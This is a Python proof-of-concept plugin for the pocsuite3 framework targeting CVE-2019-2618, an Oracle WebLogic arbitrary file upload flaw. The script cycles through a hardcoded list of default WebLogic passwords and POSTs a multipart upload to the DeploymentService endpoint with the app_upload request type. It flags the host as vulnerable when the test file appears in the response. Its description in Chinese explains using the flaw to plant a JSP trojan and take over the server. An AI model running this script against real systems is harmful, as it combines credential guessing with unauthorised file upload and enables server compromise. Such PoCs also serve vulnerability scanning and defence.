#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
import requests
passwd = ['weblogic','weblogic1','weblogic10','weblogic123','Oracle@123', 'HEZ9Z6mi']

payload = "------WebKitFormBoundaryPZVT5lymen1556Ma\r\nContent-Disposition: form-data; name=\"file\"; filename=\"11.tmp\"\r\nContent-Type: text/html\r\n\r\n 12341234 \r\n\r\n------WebKitFormBoundaryPZVT5lymen1556Ma--"
class TestPOC(POCBase):
    name = 'OracleWeblogic_FileUpload_CVE-2019-2618'
    vulID = 'CVE-2019-2618'  
    author = ['debug']
    vulType = 'File Upload'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''
		   利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。
		   攻击者突破了OAM（Oracle Access Management）认证，设置wl_request_type参数为app_upload，
		   构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限
	       '''

    vulDate = '2018-12-14'
    createDate = '2018-12-14'
    updateDate = '2018-12-14'

    appName = 'Oracle Weblogic'
    appVersion = '10.3.6.0.0,12.1.3.0.0,12.2.1.3.0'
    appPowerLink = ''
    samples = ['']   
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        url=self.url+ "/bea_wls_deployment_internal/DeploymentService"
        for password in passwd:
            headers = {
            'content-type': "multipart/form-data; boundary=----WebKitFormBoundaryPZVT5lymen1556Ma",
            "username":"weblogic",
            "password":password,
            'wl_request_type': "app_upload",
            'wl_upload_application_name': "/",
            'archive': "true",
            }
        
            req = requests.post(url=url, data=payload,headers=headers)
            print(req)
            print(req.text)
            if "DeploymentService" not in req.text and req.status_code == 200 and '11.tmp' in req.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url+ ' OracleWeblogic_FileUpload_CVE-2019-2618' + ' is exist!'
                break
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
